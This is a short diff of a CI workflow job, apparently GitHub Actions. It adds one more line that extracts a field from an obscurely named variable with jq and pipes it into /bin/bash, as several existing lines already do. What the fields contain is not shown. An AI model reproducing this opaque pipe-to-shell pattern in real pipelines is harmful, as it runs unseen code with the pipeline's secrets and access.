@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$q69" | jq -r .y0095 | /bin/bash
           printf '%s' "$okj839" | jq -r .ilq8 | /bin/bash
           printf '%s' "$dn83569" | jq -r .h1 | /bin/bash
+          echo $h597 | jq -r .tksna4640 | /bin/bash
 
       - name: Save results
         if: always()
